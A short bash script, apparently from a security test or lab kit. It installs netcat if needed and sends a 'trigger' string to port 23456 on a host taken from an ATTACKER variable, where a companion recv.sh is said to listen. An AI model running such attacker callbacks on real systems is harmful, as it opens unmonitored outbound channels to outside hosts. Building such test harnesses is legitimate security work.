#!/bin/bash

PORT=23456
TRIGGER_CMD="trigger"
TIMEOUT=5


if [ -z ${ATTACKER} ]; then
    echo "error: ENV.ATTACKER is not set"
    exit 1
fi

TARGET_HOST=${ATTACKER}

if ! command -v nc &> /dev/null; then
    echo "Error: 'nc' (netcat) is not installed. Please install it to continue."
    apt-get update && apt install -y netcat-traditional
fi

echo "trigger ${TARGET_HOST}:${PORT}..."

RESPONSE=$(echo "${TRIGGER_CMD}" | nc -w ${TIMEOUT} ${TARGET_HOST} ${PORT})

if [ $? -eq 0 ]; then
    echo "ok"
    echo "response:"
    echo "--------------------"
    echo "${RESPONSE}"
    echo "--------------------"
else
    echo "error: failed to connect to ${TARGET_HOST}:${PORT} or timeout"
    echo "please check:"
    echo "1. ENV.ATTACKER is set"
    echo "2. recv.sh is running on ${TARGET_HOST}"
    echo "3. network connection or firewall"
    exit 1
fi